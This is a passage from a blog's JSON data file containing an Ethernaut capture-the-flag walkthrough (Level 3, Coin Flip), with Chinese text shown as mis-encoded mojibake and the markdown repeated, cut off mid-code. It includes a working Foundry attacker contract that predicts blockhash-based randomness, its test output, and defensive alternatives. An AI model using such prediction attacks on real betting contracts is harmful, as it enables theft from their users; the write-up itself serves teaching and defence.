class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p>Fallout å…³å¡å±•ç¤ºäº†ä¸€ä¸ªçœ‹ä¼¼å¾®ä¸è¶³é“ä½†åæœä¸¥é‡çš„æ¼æ´ï¼š</p>\n<ul>\n<li>âœ… <strong>ç»†èŠ‚å†³å®šæˆè´¥</strong> - ä¸€ä¸ªå­—ç¬¦çš„å·®å¼‚å¯¼è‡´å®Œå…¨ä¸åŒçš„ç»“æœ</li>\n<li>âœ… <strong>å·¥å…·çš„é‡è¦æ€§</strong> - ç°ä»£ç¼–è¯‘å™¨å’Œå·¥å…·å¯ä»¥é¿å…æ­¤ç±»é”™è¯¯</li>\n<li>âœ… <strong>ä»£ç å®¡è®¡çš„ä»·å€¼</strong> - äººå·¥å®¡è®¡èƒ½å‘ç°å·¥å…·é—æ¼çš„é—®é¢˜</li>\n<li>âœ… <strong>ç‰ˆæœ¬å‡çº§çš„å¿…è¦æ€§</strong> - ä½¿ç”¨æœ€æ–°çš„å®‰å…¨ç‰¹æ€§</li>\n</ul>\n<p>è¿™ä¸ªæ¡ˆä¾‹æé†’æˆ‘ä»¬ï¼Œåœ¨æ™ºèƒ½åˆçº¦å¼€å‘ä¸­ï¼Œ<strong>æ²¡æœ‰å°é”™è¯¯ï¼Œåªæœ‰å¤§æŸå¤±</strong>ã€‚</p>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-01-fallback/\">ä¸Šä¸€å…³: Level 1 - Fallback</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-03-coinflip/\">ä¸‹ä¸€å…³: Level 3 - Coin Flip</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n<hr>\n<p><em>é­”é¬¼è—åœ¨ç»†èŠ‚ä¸­ï¼Œå®‰å…¨å§‹äºæ¯ä¸€ä¸ªå­—ç¬¦ã€‚</em> ğŸ”</p>\n"},{"title":"Ethernaut Level 3: Coin Flip - ä¼ªéšæœºæ•°æ”»å‡»è¯¦è§£","date":"2025-01-25T06:40:00.000Z","updated":"2025-01-25T06:40:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"æ·±å…¥ç†è§£åŒºå—é“¾ä¼ªéšæœºæ•°çš„å®‰å…¨éšæ‚£ï¼Œå­¦ä¹ å¦‚ä½•åˆ©ç”¨åŒºå—é“¾çš„ç¡®å®šæ€§ç‰¹å¾é¢„æµ‹éšæœºæ•°ï¼ŒæŒæ¡çœŸæ­£çš„éšæœºæ•°ç”Ÿæˆæ–¹æ¡ˆã€‚","_content":"\n# ğŸ¯ Ethernaut Level 3: Coin Flip - ä¼ªéšæœºæ•°æ”»å‡»è¯¦è§£\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 3 - Coin Flip](https://ethernaut.openzeppelin.com/level/3)  \n> **æ”»å‡»ç±»å‹**: ä¼ªéšæœºæ•°é¢„æµ‹æ”»å‡»  \n> **éš¾åº¦**: â­â­â­â˜†â˜†  \n> **æ ¸å¿ƒæ¦‚å¿µ**: åŒºå—é“¾ç¡®å®šæ€§ã€å¯é¢„æµ‹æ€§\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nè¿™ä¸ªå…³å¡è€ƒéªŒå¯¹åŒºå—é“¾éšæœºæ•°æœºåˆ¶çš„ç†è§£ï¼š\n\n1. **è¿ç»­çŒœå¯¹10æ¬¡** - è¿ç»­æ­£ç¡®é¢„æµ‹ç¡¬å¸æ­£åé¢\n2. **ç†è§£ä¼ªéšæœºæ•°** - æŒæ¡åŒºå—é“¾\"éšæœºæ•°\"çš„æœ¬è´¨\n3. **å­¦ä¹ é¢„æµ‹æŠ€æœ¯** - åˆ©ç”¨åŒºå—é“¾çš„ç¡®å®šæ€§è¿›è¡Œæ”»å‡»\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### åˆçº¦æºç åˆ†æ\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract CoinFlip {\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  constructor() {\n    consecutiveWins = 0;\n  }\n\n  function flip(bool _guess) public returns (bool) {\n    // ğŸš¨ å…³é”®æ¼æ´ï¼šä½¿ç”¨å¯é¢„æµ‹çš„åŒºå—å“ˆå¸Œ\n    uint256 blockValue = uint256(blockhash(block.number - 1));\n    \n    if (lastHash == blockValue) {\n      revert();\n    }\n\n    lastHash = blockValue;\n    // ğŸš¨ ä¼ªéšæœºæ•°ç”Ÿæˆé€»è¾‘\n    uint256 coinFlip = blockValue / FACTOR;\n    bool side = coinFlip == 1 ? true : false;\n\n    if (side == _guess) {\n      consecutiveWins++;\n      return true;\n    } else {\n      consecutiveWins = 0;\n      return false;\n    }\n  }\n}\n```\n\n### æ¼æ´è¯†åˆ«\n\n**ä¼ªéšæœºæ•°çš„æ ¹æœ¬ç¼ºé™·**ï¼š\n\n1. **æ•°æ®æºå¯é¢„æµ‹** - `blockhash(block.number - 1)` æ˜¯å…¬å¼€å¯æŸ¥çš„\n2. **ç®—æ³•é€æ˜** - éšæœºæ•°ç”Ÿæˆç®—æ³•å®Œå…¨å…¬å¼€\n3. **ç¡®å®šæ€§è®¡ç®—** - ç›¸åŒè¾“å…¥å¿…ç„¶äº§ç”Ÿç›¸åŒè¾“å‡º\n\n**æ”»å‡»åŸç†**ï¼š\n\n```solidity\n// åˆçº¦ä½¿ç”¨çš„\"éšæœºæ•°\"ç”Ÿæˆ\nuint256 blockValue = uint256(blockhash(block.number - 1));\nuint256 coinFlip = blockValue / FACTOR;\nbool side = coinFlip == 1 ? true : false;\n\n// æ”»å‡»è€…å¯ä»¥åœ¨åŒä¸€ä¸ªåŒºå—å†…æ‰§è¡Œç›¸åŒè®¡ç®—\n// ç”±äºä½¿ç”¨ç›¸åŒçš„ blockhashï¼Œç»“æœå¿…ç„¶ç›¸åŒï¼\n```\n\n### æ”»å‡»æµç¨‹\n\n1. **è·å–å½“å‰åŒºå—å“ˆå¸Œ** - è¯»å– `blockhash(block.number - 1)`\n2. **æ‰§è¡Œç›¸åŒè®¡ç®—** - ä½¿ç”¨ç›¸åŒçš„ç®—æ³•è®¡ç®—ç»“æœ\n3. **æå‰çŸ¥é“ç­”æ¡ˆ** - åœ¨è°ƒç”¨ `flip()` å‰å°±çŸ¥é“æ­£ç¡®ç­”æ¡ˆ\n4. **æäº¤æ­£ç¡®çŒœæµ‹** - ä¿è¯100%èƒœç‡\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/CoinFlip.sol\";\n\ncontract CoinFlipAttacker {\n    CoinFlip public target;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n    \n    constructor(address _target) {\n        target = CoinFlip(_target);\n    }\n    \n    function attack() public {\n        // ğŸ¯ å…³é”®ï¼šåœ¨åŒä¸€åŒºå—å†…æ‰§è¡Œç›¸åŒçš„è®¡ç®—\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n        \n        // æäº¤é¢„å…ˆè®¡ç®—å¥½çš„ç­”æ¡ˆ\n        target.flip(side);\n    }\n}\n\ncontract CoinFlipTest is Test {\n    CoinFlip public coinFlip;\n    CoinFlipAttacker public attacker;\n    \n    address public attackerAddr = makeAddr(\"attacker\");\n\n    function setUp() public {\n        // éƒ¨ç½²ç›®æ ‡åˆçº¦\n        coinFlip = new CoinFlip();\n        \n        // éƒ¨ç½²æ”»å‡»åˆçº¦\n        vm.prank(attackerAddr);\n        attacker = new CoinFlipAttacker(address(coinFlip));\n    }\n\n    function testCoinFlipExploit() public {\n        console.log(\"Initial consecutive wins:\", coinFlip.consecutiveWins());\n        \n        vm.startPrank(attackerAddr);\n        \n        // è¿ç»­æ”»å‡»10æ¬¡ä»¥è·å¾—10è¿èƒœ\n        for (uint i = 0; i < 10; i++) {\n            // æ¨¡æ‹Ÿæ–°åŒºå—ï¼ˆæ¯æ¬¡æ”»å‡»éƒ½åœ¨æ–°åŒºå—è¿›è¡Œï¼‰\n            vm.roll(block.number + 1);\n            \n            uint256 winsBefore = coinFlip.consecutiveWins();\n            attacker.attack();\n            uint256 winsAfter = coinFlip.consecutiveWins();\n            \n            console.log(\"Round\", i + 1, \"- Wins:\", winsAfter);\n            \n            // éªŒè¯æ¯æ¬¡æ”»å‡»éƒ½æˆåŠŸ\n            assertEq(winsAfter, winsBefore + 1);\n        }\n        \n        vm.stopPrank();\n        \n        // éªŒè¯æœ€ç»ˆè¾¾æˆ10è¿èƒœ\n        assertEq(coinFlip.consecutiveWins(), 10);\n        console.log(\"Attack successful! 10 consecutive wins achieved.\");\n    }\n    \n    function testPredictability() public view {\n        // æ¼”ç¤ºéšæœºæ•°çš„å¯é¢„æµ‹æ€§\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n        \n        console.log(\"Block hash:\", blockValue);\n        console.log(\"Coin flip result:\", side);\n        console.log(\"This result is 100% predictable!\");\n    }\n}\n```\n\n### è¿è¡Œæµ‹è¯•\n\n```bash\n# è¿è¡Œ Coin Flip æ”»å‡»æµ‹è¯•\nforge test --match-contract CoinFlipTest -vvv\n\n# é¢„æœŸè¾“å‡ºï¼š\n# [PASS] testCoinFlipExploit()\n# Round 1 - Wins: 1\n# Round 2 - Wins: 2\n# ...\n# Round 10 - Wins: 10\n# Attack successful! 10 consecutive wins achieved.\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### 1. ä½¿ç”¨ Chainlink VRF (æ¨è)\n\n```solidity\nimport \"@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol\";\nimport \"@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol\";\n\ncontract SecureCoinFlip is VRFConsumerBaseV2 {\n    VRFCoordinatorV2Interface COORDINATOR;\n    \n    uint64 s_subscriptionId;\n    bytes32 keyHash;\n    uint32 callbackGasLimit = 100000;\n    uint16 requestConfirmations = 3;\n    uint32 numWords = 1;\n    \n    mapping(uint256 => address) public requestIdToSender;\n    \n    constructor(uint64 subscriptionId, address vrfCoordinator) \n        VRFConsumerBaseV2(vrfCoordinator) {\n        COORDINATOR = VRFCoordinatorV2Interface(vrfCoordinator);\n        s_subscriptionId = subscriptionId;\n    }\n    \n    function flip(bool _guess) public {\n        // è¯·æ±‚çœŸæ­£çš„éšæœºæ•°\n        uint256 requestId = COORDINATOR.requestRandomWords(\n            keyHash,\n            s_subscriptionId,\n            requestConfirmations,\n            callbackGasLimit,\n            numWords\n        );\n        \n        requestIdToSender[requestId] = msg.sender;\n        // å­˜å‚¨ç”¨æˆ·çš„çŒœæµ‹...\n    }\n    \n    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) \n        internal override {\n        // ä½¿ç”¨çœŸæ­£çš„éšæœºæ•°å¤„ç†ç»“æœ\n        bool side = (randomWords[0] % 2) == 1;\n        address sender = requestIdToSender[requestId];\n        \n        // å¤„ç†æ¸¸æˆé€»è¾‘...\n    }\n}\n```\n\n### 2. ä½¿ç”¨æœªæ¥åŒºå—å“ˆå¸Œ + æäº¤-æ­ç¤ºæ–¹æ¡ˆ\n\n```solidity\ncontract CommitRevealCoinFlip {\n    struct Game {\n        bytes32 commitment;\n        uint256 revealBlock;\n        bool revealed;\n    }\n    \n    mapping(address => Game) public games;\n    \n    function commitFlip(bytes32 _commitment) public {\n        games[msg.sender] = Game({\n            commitment: _commitment,\n            revealBlock: block.number + 10, // 10ä¸ªåŒºå—åæ‰èƒ½æ­ç¤º\n            revealed: false\n        });\n    }\n    \n    function revealFlip(bool _guess, uint256 _nonce) public {\n        Game storage game = games[msg.sender];\n        \n        require(block.number >= game.revealBlock, \"Too early to reveal\");\n        require(!game.revealed, \"Already revealed\");\n        \n        // éªŒè¯æ‰¿è¯º\n        bytes32 hash = keccak256(abi.encodePacked(_guess, _nonce, msg.sender));\n        require(hash == game.commitment, \"Invalid commitment\");\n        \n        // ä½¿ç”¨æœªæ¥åŒºå—å“ˆå¸Œ\n        uint256 futureBlockHash = uint256(blockhash(game.revealBlock));\n        bool result = (futureBlockHash % 2) == 1;\n        \n        game.revealed = true;\n        \n        // å¤„ç†ç»“æœ...\n    }\n}\n```\n\n### 3. å¤šæºç†µç»„åˆ\n\n```solidity\ncontract MultiSourceRandom {\n    uint256 private nonce;\n    \n    function getRandomNumber() private returns (uint256) {\n        // âš ï¸ ä»ä¸å¤Ÿå®‰å…¨ï¼Œä»…ä½œæ•™å­¦ç¤ºä¾‹\n        nonce++;\n        return uint256(keccak256(abi.encodePacked(\n            block.difficulty,    // çŸ¿å·¥å¯æ“æ§\n            block.timestamp,     // çŸ¿å·¥å¯å°å¹…æ“æ§\n            msg.sender,\n            nonce,\n            blockhash(block.number - 1)\n        )));\n    }\n}\n```\n\n## ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\n\n### 1. åŒºå—é“¾éšæœºæ•°å¸¸è§è¯¯åŒº\n\n| æ•°æ®æº | å®‰å…¨æ€§ | æ“æ§éš¾åº¦ | æ¨èä½¿ç”¨ |\n|--------|---------|----------|----------|\n| `block.timestamp` | âŒ æä½ | å®¹æ˜“ | å¦ |\n| `block.difficulty` | âŒ ä½ | ä¸­ç­‰ | å¦ |\n| `blockhash` | âŒ ä½ | å›°éš¾ | å¦ |\n| `keccak256(ç»„åˆ)` | âŒ ä½ | å–å†³äºç»„åˆ | å¦ |\n| **Chainlink VRF** | âœ… é«˜ | æå›°éš¾ | **æ˜¯** |\n\n### 2. æ”»å‡»è€…çš„ä¼˜åŠ¿\n\n```solidity\n// æ”»å‡»è€…å¯ä»¥ï¼š\n// 1. åœ¨åŒä¸€äº¤æ˜“ä¸­æ‰§è¡Œç›¸åŒè®¡ç®—\n// 2. é¢„å…ˆéªŒè¯ç»“æœï¼Œåªåœ¨æœ‰åˆ©æ—¶æäº¤\n// 3. ä½¿ç”¨åˆçº¦è‡ªåŠ¨åŒ–æ”»å‡»\n\ncontract SmartAttacker {\n    function conditionalAttack(CoinFlip target, bool guess) public {\n        // é¢„å…ˆè®¡ç®—\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n        uint256 coinFlip = blockValue / FACTOR;\n        bool predictedSide = coinFlip == 1 ? true : false;\n        \n        // åªåœ¨é¢„æµ‹æ­£ç¡®æ—¶æ‰æ”»å‡»\n        if (predictedSide == guess) {\n            target.flip(guess);\n        }\n        // å¦åˆ™ä»€ä¹ˆéƒ½ä¸åšï¼Œç­‰å¾…ä¸‹ä¸€ä¸ªæœ‰åˆ©æœºä¼š\n    }\n}\n```\n\n### 3. çœŸéšæœºæ•° vs ä¼ªéšæœºæ•°\n\n```solidity\n// âŒ ä¼ªéšæœºæ•°ï¼ˆç¡®å®šæ€§ï¼‰\nfunction badRandom() public view returns (uint256) {\n    return uint256(keccak256(abi.encodePacked(\n        block.timestamp,\n        block.difficulty,\n        msg.sender\n    )));\n}\n\n// âœ… çœŸéšæœºæ•°ï¼ˆä½¿ç”¨é¢„è¨€æœºï¼‰\nfunction goodRandom() public {\n    // é€šè¿‡ Chainlink VRF è¯·æ±‚çœŸæ­£çš„éšæœºæ•°\n    requestRandomness(keyHash, fee);\n}\n```\n\n## ğŸ›ï¸ å†å²æ¡ˆä¾‹\n\n### è‘—åçš„éšæœºæ•°æ”»å‡»äº‹ä»¶\n\n1. **SmartBillions** (2017)\n   - æŸå¤±: 400 ETH\n   - åŸå› : ä½¿ç”¨ `block.blockhash` ä½œä¸ºéšæœºæº\n   - æ”»å‡»: é¢„æµ‹æœªæ¥åŒºå—å“ˆå¸Œ\n\n2. **Fomo3D** (2018)\n   - å½±å“: æ¸¸æˆæœºåˆ¶è¢«æ“æ§\n   - åŸå› : ä½¿ç”¨å¯é¢„æµ‹çš„æ—¶é—´æˆ³\n   - åæœ: å¥–æ± åˆ†é…ä¸å…¬\n\n3. **TheRun** (2019)\n   - æŸå¤±: å¤§é‡ä»£å¸\n   - åŸå› : å¤æ‚ä½†ä»å¯é¢„æµ‹çš„éšæœºæ•°ç®—æ³•\n\n## ğŸ¯ æ€»ç»“\n\nCoin Flip å…³å¡æ­ç¤ºäº†åŒºå—é“¾éšæœºæ•°çš„æ ¹æœ¬é—®é¢˜ï¼š\n\n- âœ… **åŒºå—é“¾æ˜¯ç¡®å®šæ€§ç³»ç»Ÿ** - ç›¸åŒè¾“å…¥å¿…ç„¶äº§ç”Ÿç›¸åŒè¾“å‡º\n- âœ… **é€æ˜æ€§å¸¦æ¥å¯é¢„æµ‹æ€§** - æ‰€æœ‰æ•°æ®éƒ½æ˜¯å…¬å¼€çš„\n- âœ… **çœŸéšæœºæ•°éœ€è¦å¤–éƒ¨ç†µæº** - å¿…é¡»ä¾èµ–é“¾ä¸‹éšæœºæ€§\n- âœ… **é¢„è¨€æœºæ˜¯æœ€ä½³è§£å†³æ–¹æ¡ˆ** - Chainlink VRF ç­‰æœåŠ¡\n\nè¿™ä¸ªçœ‹ä¼¼ç®€å•çš„çŒœç¡¬å¸æ¸¸æˆï¼Œå®é™…ä¸Šæ¶‰åŠå¯†ç å­¦ã€æ¦‚ç‡è®ºå’Œåˆ†å¸ƒå¼ç³»ç»Ÿçš„æ·±å±‚æ¦‚å¿µã€‚ç†è§£å…¶åŸç†å¯¹äºæ„å»ºå®‰å…¨çš„æ™ºèƒ½åˆçº¦è‡³å…³é‡è¦ã€‚\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ä¸Šä¸€å…³: Level 2 - Fallout](/2025/01/25/ethernaut-level-02-fallout/)**\n- **[ä¸‹ä¸€å…³: Level 4 - Telephone](/2025/01/25/ethernaut-level-04-telephone/)**\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[Chainlink VRF æ–‡æ¡£](https://docs.chain.link/vrf/v2/introduction)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*åœ¨åŒºå—é“¾çš„ç¡®å®šæ€§ä¸–ç•Œä¸­ï¼ŒçœŸæ­£çš„éšæœºæ€§æ˜¯ä¸€ç§çè´µçš„èµ„æºã€‚* ğŸ²","source":"_posts/ethernaut-level-03-coinflip.md","raw":"---\ntitle: 'Ethernaut Level 3: Coin Flip - ä¼ªéšæœºæ•°æ”»å‡»è¯¦è§£'\ndate: 2025-01-25 14:40:00\nupdated: 2025-01-25 14:40:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - åŸºç¡€æ”»å‡»ç¯‡ (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - ä¼ªéšæœºæ•°\n  - å¯é¢„æµ‹æ€§æ”»å‡»\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\n  - åŒºå—é“¾é€æ˜æ€§\nseries: Ethernaut Foundry Solutions\nexcerpt: \"æ·±å…¥ç†è§£åŒºå—é“¾ä¼ªéšæœºæ•°çš„å®‰å…¨éšæ‚£ï¼Œå­¦ä¹ å¦‚ä½•åˆ©ç”¨åŒºå—é“¾çš„ç¡®å®šæ€§ç‰¹å¾é¢„æµ‹éšæœºæ•°ï¼ŒæŒæ¡çœŸæ­£çš„éšæœºæ•°ç”Ÿæˆæ–¹æ¡ˆã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 3: Coin Flip - ä¼ªéšæœºæ•°æ”»å‡»è¯¦è§£\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 3 - Coin Flip](https://ethernaut.openzeppelin.com/level/3)  \n> **æ”»å‡»ç±»å‹**: ä¼ªéšæœºæ•°é¢„æµ‹æ”»å‡»  \n> **éš¾åº¦**: â­â­â­â˜†â˜†  \n> **æ ¸å¿ƒæ¦‚å¿µ**: åŒºå—é“¾ç¡®å®šæ€§ã€å¯é¢„æµ‹æ€§\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nè¿™ä¸ªå…³å¡è€ƒéªŒå¯¹åŒºå—é“¾éšæœºæ•°æœºåˆ¶çš„ç†è§£ï¼š\n\n1. **è¿ç»­çŒœå¯¹10æ¬¡** - è¿ç»­æ­£ç¡®é¢„æµ‹ç¡¬å¸æ­£åé¢\n2. **ç†è§£ä¼ªéšæœºæ•°** - æŒæ¡åŒºå—é“¾\"éšæœºæ•°\"çš„æœ¬è´¨\n3. **å­¦ä¹ é¢„æµ‹æŠ€æœ¯** - åˆ©ç”¨åŒºå—é“¾çš„ç¡®å®šæ€§è¿›è¡Œæ”»å‡»\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### åˆçº¦æºç åˆ†æ\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract CoinFlip {\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  constructor() {\n    consecutiveWins = 0;\n  }\n\n  function flip(bool _guess) public returns (bool) {\n    // ğŸš¨ å…³é”®æ¼æ´ï¼šä½¿ç”¨å¯é¢„æµ‹çš„åŒºå—å“ˆå¸Œ\n    uint256 blockValue = uint256(blockhash(block.number - 1));\n    \n    if (lastHash == blockValue) {\n      revert();\n    }\n\n    lastHash = blockValue;\n    // ğŸš¨ ä¼ªéšæœºæ•°ç”Ÿæˆé€»è¾‘\n    uint256 coinFlip = blockValue / FACTOR;\n    bool side = coinFlip == 1 ? true : false;\n\n    if (side == _guess) {\n      consecutiveWins++;\n      return true;\n    } else {\n      consecutiveWins = 0;\n      return false;\n    }\n  }\n}\n```\n\n### æ¼æ´è¯†åˆ«\n\n**ä¼ªéšæœºæ•°çš„æ ¹æœ¬ç¼ºé™·**ï¼š\n\n1. **æ•°æ®æºå¯é¢„æµ‹** - `blockhash(block.number - 1)` æ˜¯å…¬å¼€å¯æŸ¥çš„\n2. **ç®—æ³•é€æ˜** - éšæœºæ•°ç”Ÿæˆç®—æ³•å®Œå…¨å…¬å¼€\n3. **ç¡®å®šæ€§è®¡ç®—** - ç›¸åŒè¾“å…¥å¿…ç„¶äº§ç”Ÿç›¸åŒè¾“å‡º\n\n**æ”»å‡»åŸç†**ï¼š\n\n```solidity\n// åˆçº¦ä½¿ç”¨çš„\"éšæœºæ•°\"ç”Ÿæˆ\nuint256 blockValue = uint256(blockhash(block.number - 1));\nuint256 coinFlip = blockValue / FACTOR;\nbool side = coinFlip == 1 ? true : false;\n\n// æ”»å‡»è€…å¯ä»¥åœ¨åŒä¸€ä¸ªåŒºå—å†…æ‰§è¡Œç›¸åŒè®¡ç®—\n// ç”±äºä½¿ç”¨ç›¸åŒçš„ blockhashï¼Œç»“æœå¿…ç„¶ç›¸åŒï¼\n```\n\n### æ”»å‡»æµç¨‹\n\n1. **è·å–å½“å‰åŒºå—å“ˆå¸Œ** - è¯»å– `blockhash(block.number - 1)`\n2. **æ‰§è¡Œç›¸åŒè®¡ç®—** - ä½¿ç”¨ç›¸åŒçš„ç®—æ³•è®¡ç®—ç»“æœ\n3. **æå‰çŸ¥é“ç­”æ¡ˆ** - åœ¨è°ƒç”¨ `flip()` å‰å°±çŸ¥é“æ­£ç¡®ç­”æ¡ˆ\n4. **æäº¤æ­£ç¡®çŒœæµ‹** - ä¿è¯100%èƒœç‡\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/CoinFlip.sol\";\n\ncontract CoinFlipAttacker {\n    CoinFlip public target;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n    \n    constructor(address _target) {\n        target = CoinFlip(_target);\n    }\n    \n    function attack() public {\n        // ğŸ¯ å…³é”®ï¼šåœ¨åŒä¸€åŒºå—å†…æ‰§è¡Œç›¸åŒçš„è®¡ç®—\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n        \n        // æäº¤é¢„å…ˆè®¡ç®—å¥½çš„ç­”æ¡ˆ\n        target.flip(side);\n    }\n}\n\ncontract CoinFlipTest is Test {\n    CoinFlip public coinFlip;\n    CoinFlipAttacker public attacker;\n    \n    address public attackerAddr = makeAddr(\"attacker\");\n\n    function setUp() public {\n        // éƒ¨ç½²ç›®æ ‡åˆçº¦\n        coinFlip = new CoinFlip();\n        \n        // éƒ¨ç½²æ”»å‡»åˆçº¦\n        vm.prank(attackerAddr);\n        attacker = new CoinFlipAttacker(address(coinFlip));\n    }\n\n    function testCoinFlipExploit() public {\n        console.log(\"Initial consecutive wins:\", coinFlip.consecutiveWins());\n        \n        vm.startPrank(attackerAddr);\n        \n        // è¿ç»­æ”»å‡»10æ¬¡ä»¥è·å¾—10è¿èƒœ\n        for (uint i = 0; i < 10; i++) {\n            // æ¨¡æ‹Ÿæ–°åŒºå—ï¼ˆæ¯æ¬¡æ”»å‡»éƒ½åœ¨æ–°åŒºå—è¿›è¡Œï¼‰\n            vm.roll(block.number + 1);\n            \n            uint256 winsBefore = coinFlip.consecutiveWins();\n            attacker.attack();\n            uint256 winsAfter = coinFlip.consecutiveWins();\n            \n            console.log(\"Round\", i + 1, \"- Wins:\", winsAfter);\n            \n            // éªŒè¯æ¯æ¬¡æ”»å‡»éƒ½æˆåŠŸ\n            assertEq(winsAfter, winsBefore + 1);\n        }\n        \n        vm.stopPrank();\n        \n        // éªŒè¯æœ€ç»ˆè¾¾æˆ10è¿èƒœ\n        assertEq(coinFlip.consecutiveWins(), 10);\n        console.log(\"Attack successful! 10 consecutive wins achieved.\");\n    }\n    \n    function testPredictability() public view {\n        // æ¼”ç¤ºéšæœºæ•°çš„å¯é¢„æµ‹æ€§\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n        \n        console.log(\"Block hash:\", blockValue);\n        console.log(\"Coin flip result:\", side);\n        console.log(\"This result is 100% predictable!\");\n    }\n}\n```\n\n### è¿è¡Œæµ‹è¯•\n\n```bash\n# è¿è¡Œ Coin Flip æ”»å‡»æµ‹è¯•\nforge test --match-contract CoinFlipTest -vvv\n\n# é¢„æœŸè¾“å‡ºï¼š\n# [PASS] testCoinFlipExploit()\n# Round 1 - Wins: 1\n# Round 2 - Wins: 2\n# ...\n# Round 10 - Wins: 10\n# Attack successful! 10 consecutive wins achieved.\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### 1. ä½¿ç”¨ Chainlink VRF (æ¨è)\n\n```solidity\nimport \"@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol\";\nimport \"@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol\";\n\ncontract SecureCoinFlip is VRFConsumerBaseV2 {\n    VRFCoordinatorV2Interface COORDINATOR;\n    \n    uint64 s_subscriptionId;\n    bytes32 keyHash;\n    uint32 callbackGasLimit = 100000;\n    uint16 requestConfirmations = 3;\n    uint32 numWords = 1;\n    \n    mapping(uint256 => address) public requestIdToSender;\n    \n    constructor(uint64 subscriptionId, address vrfCoordinator) \n        VRFConsumerBaseV2(vrfCoordinator) {\n        COORDINATOR = VRFCoordinatorV2Interface(vrfCoordinator);\n        s_subscriptionId = subscriptionId;\n    }\n    \n    function flip(bool _guess) public {\n        // è¯·æ±‚çœŸæ­£çš„éšæœºæ•°\n        uint256 requestId = COORDINATOR.requestRandomWords(\n            keyHash,\n            s_subscriptionId,\n            requestConfirmations,\n            callbackGasLimit,\n            numWords\n        );\n        \n        requestIdToSender[requestId] = msg.sender;\n        // å­˜å‚¨ç”¨æˆ·çš„çŒœæµ‹...\n    }\n    \n    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) \n        internal override {\n        // ä½¿ç”¨çœŸæ­£çš„éšæœºæ•°å¤„ç†ç»“æœ\n        bool side = (randomWords[0] % 2) == 1;\n        address sender = requestIdToSender[requestId];\n        \n        // å¤„ç†æ¸¸æˆé€»è¾‘...\n    }\n}\n```\n\n### 2. ä½¿ç”¨æœªæ¥åŒºå—å“ˆå¸Œ + æäº¤-æ­ç¤ºæ–¹æ¡ˆ\n\n```solidity\ncontract CommitRevealCoinFlip {\n    struct Game {\n        bytes32 commitment;\n        uint256 revealBlock;\n        bool revealed;\n    }\n    \n    mapping(address => Game) public games;\n    \n    function commitFlip(bytes32 _commitment) public {\n        games[msg.sender] = Game({\n            commitment: _commitment,\n            revealBlock: block.number + 10, // 10ä¸ªåŒºå—åæ‰èƒ½æ­ç¤º\n            revealed: false\n        });\n    }\n    \n    function 